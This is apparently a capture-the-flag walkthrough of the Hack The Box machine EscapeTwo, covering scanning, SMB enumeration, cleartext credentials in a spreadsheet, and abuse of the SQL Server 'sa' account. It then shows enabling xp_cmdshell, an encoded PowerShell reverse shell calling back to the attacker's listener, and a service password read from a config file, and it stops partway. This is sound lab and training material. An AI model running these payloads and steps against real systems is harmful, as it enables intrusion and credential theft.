---
title: EscapeTwo
categories: [ctf]
tags: [adcs,esc1,esc4,certipy-ad]
#image:
#  path: 
#  alt: 
---

**EscapeTwo** is an easy difficulty level windows machine. 


> As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su
{: .prompt-info}

## Reconnaissance

### Nmap Port Scan

To begin the assessment, I conducted an Nmap port scan using default scripts and service detection. The initial results revealed several key services that pointed towards the target being a **Domain Controller**. The presence of common **Active Directory** ports such as:

- `53/tcp (DNS)`
- `389/tcp (LDAP)`
- `88/tcp (Kerberos)`

confirmed this observation. Additionally, the scan provided valuable information about the **hostname** and **domain name**, which would be critical for further enumeration and exploitation.


```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ nmap -sC -sV -p- -oA nmap_output --min-rate 10000 10.129.202.204                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 22:32 IST
Nmap scan report for 10.129.202.204
Host is up (0.13s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-12 09:46:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T09:48:37+00:00; -7h16m07s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T09:48:37+00:00; -7h16m06s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.202.204:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-12T09:48:37+00:00; -7h16m06s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.202.204:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-12T00:27:22
|_Not valid after:  2055-01-12T00:27:22
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T09:48:37+00:00; -7h16m07s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-12T09:48:37+00:00; -7h16m06s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49735/tcp open  msrpc         Microsoft Windows RPC
60733/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-12T09:47:50
|_  start_date: N/A
|_clock-skew: mean: -7h16m07s, deviation: 2s, median: -7h16m07s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 142.71 seconds

```
### Kerberos Configuration

Since **Kerberos** is the default authentication protocol in Windows networks, it’s essential to configure the system properly to ensure seamless authentication. To facilitate this, I updated the following files:

- `/etc/krb5.conf`
- `/etc/hosts`

These updates were crucial for **Kerberos** authentication to function correctly. Specifically, Kerberos relies on DNS names, and without the proper entries in these configuration files, authentication would fail. Ensuring that the system can resolve the DNS names associated with the target network was a necessary step for successful exploitation.


```plaintext
[libdefaults]
    default_realm = SEQUEL.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true
[realms]
    SEQUEL.HTB = {
        kdc = DC01.SEQUEL.HTB:88
        admin_server = DC01.SEQUEL.HTB
        master_kdc = DC01.SEQUEL.HTB
        default_domain = SEQUEL.HTB
    }
[domain_realm]
    .SEQUEL.HTB = SEQUEL.HTB
    SEQUEL.HTB= SEQUEL.HTB
```
{: file='/etc/krb5.conf'}

```plaintext
10.129.202.204    DC01
10.129.202.204    DC01.SEQUEL.HTB
10.129.202.204    SEQUEL.HTB
```
{: file='/etc/hosts'}

### Time Synchronization

To ensure proper Kerberos authentication, it is essential that the time on the attacker's machine is synchronized with the target system. Kerberos authentication relies on time-based tickets, and any significant time difference between the client and server can cause authentication failures.

To address this, I used the `ntpdate` command to synchronize the time on my attacker machine with the target machine. This step was critical for ensuring that Kerberos tickets would be valid and that authentication could proceed without issues.

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ sudo ntpdate DC01.SEQUEL.HTB
2025-01-12 19:50:29.893996 (+0530) -2.291470 +/- 0.055602 DC01.SEQUEL.HTB 10.129.202.204 s1 no-leap
CLOCK: time stepped by -2.291470
```

### SMB Share Enumeration

With the provided starter credentials, I proceeded to enumerate the available **SMB shares** on the target system using `netexec`.

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ netexec smb dc01.sequel.htb -k  -u rose -p 'KxEPkKe6R8su' --shares
SMB         dc01.sequel.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         dc01.sequel.htb 445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         dc01.sequel.htb 445    DC01             [*] Enumerated shares
SMB         dc01.sequel.htb 445    DC01             Share           Permissions     Remark
SMB         dc01.sequel.htb 445    DC01             -----           -----------     ------
SMB         dc01.sequel.htb 445    DC01             Accounting Department READ            
SMB         dc01.sequel.htb 445    DC01             ADMIN$                          Remote Admin
SMB         dc01.sequel.htb 445    DC01             C$                              Default share
SMB         dc01.sequel.htb 445    DC01             IPC$            READ            Remote IPC
SMB         dc01.sequel.htb 445    DC01             NETLOGON        READ            Logon server share 
SMB         dc01.sequel.htb 445    DC01             SYSVOL          READ            Logon server share 
SMB         dc01.sequel.htb 445    DC01             Users           READ            
```

#### SMB Share Analysis

During the enumeration of SMB shares, I gained **READ** access to two folders: **Accounting Department** and **Users**. While the **Users** folder did not contain any files of immediate value, I found two interesting **.xlsx** files in the **Accounting Department** share:

- `accounting_2024.xlsx`
- `accounts.xlsx`

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ smbclient //dc01.sequel.htb/'Accounting Department' -U sequel/rose%'KxEPkKe6R8su'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 16:22:21 2024
  ..                                  D        0  Sun Jun  9 16:22:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 15:44:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 16:22:07 2024

		6367231 blocks of size 4096. 919618 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (10.6 KiloBytes/sec) (average 10.6 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (14.3 KiloBytes/sec) (average 11.8 KiloBytes/sec)
```

#### Analysis of XLSX Files

Both of the `.xlsx` files appeared to be corrupt at first glance. However, upon further investigation, I opened the `sharedStrings.xml` file inside the `accounts.xlsx`. To my surprise, this file contained **cleartext credentials** that were of significant value.

![alt text](/assets/img/htb/escapetwo/accounts_xlsx.png)

|First Name|Last Name|Email|Username|Password|
|----------|---------|-----|--------|---------|
|Angela|Martin|angela@sequel.htb|angela|0fwz7Q4mSpurIt99|
|Oscar|Martinez|oscar@sequel.htb|oscar|86LxLBMgEWaKUnBG|
|Kevin|Malone|kevin@sequel.htb|kevin|Md9Wlq1E5bZnVDVo|
|NULL||sa@sequel.htb|sa|MSSQLP@ssw0rd!|

#### SQL Server Credential Validation

Among the discovered credentials, the account `sa@sequel.htb` appeared to be the most promising. I quickly validated these credentials by attempting a connection with `netexec`, and the authentication was successful.

Additionally, by using the `-X` flag, I was able to remotely execute commands on the SQL Server. Upon further investigation, it became apparent that the SQL Server was running under the context of the `sequel\sql_svc` account, which provided a potential pivot point for further exploitation.

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ netexec mssql DC01.SEQUEL.HTB --local-auth -u sa -p 'MSSQLP@ssw0rd!' -X whoami
MSSQL       10.129.202.204  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.202.204  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.129.202.204  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.202.204  1433   DC01             sequel\sql_svc
```

## Foothold

## MSSQL

Using the `impacket-mssqlclient` tool, I successfully logged into the SQL Server with the previously discovered credentials. This provided direct access to the SQL environment, allowing me to further explore potential avenues for exploitation or privilege escalation.

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@DC01.SEQUEL.HTB 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

Although the `xp_cmdshell` stored procedure was initially disabled on the SQL Server, I was able to re-enable it by executing the `enable_xp_cmdshell` command. This allowed me to execute operating system commands directly from within the SQL Server environment, providing a valuable foothold for further exploitation.

```shell
SQL (sa  dbo@master)> xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL             

SQL (sa  dbo@master)> 
```

### Obtaining a Reverse Shell

At this point, the capabilities provided by `impacket-mssqlclient` were limited, so I decided to escalate my access by obtaining a **reverse shell**. To achieve this, I generated a **PowerShell payload** using the [Reverse Shell Generator](https://www.revshells.com/). This tool allowed me to create a custom payload to establish a reverse shell, enabling full command-line access to the target system.


![PowerShell base64 payload](/assets/img/htb/escapetwo/PowerShell%20base64%20payload.png)

STart the listener on port 4444

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ rlwrap nc -lvnp 4444  
```

Run the payload-

```shell
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADQAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

Reverseshell has been established:

```shell
┌──(kali㉿kali)-[~/hack-the-box/escapetwo]
└─$ rlwrap nc -lvnp 4444                                                     

listening on [any] 4444 ...

connect to [10.10.14.104] from (UNKNOWN) [10.129.202.204] 59928
PS C:\Windows\system32> 
```

I was able to find the credentials for `SEQUEL\sql_svc` in `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`

```shell
PS C:\SQL2019\ExpressAdv_ENU> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```
{: file='C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI'}

Since this is a service account, I am going to check if its password has been reused. This is a common mistake that admins make.

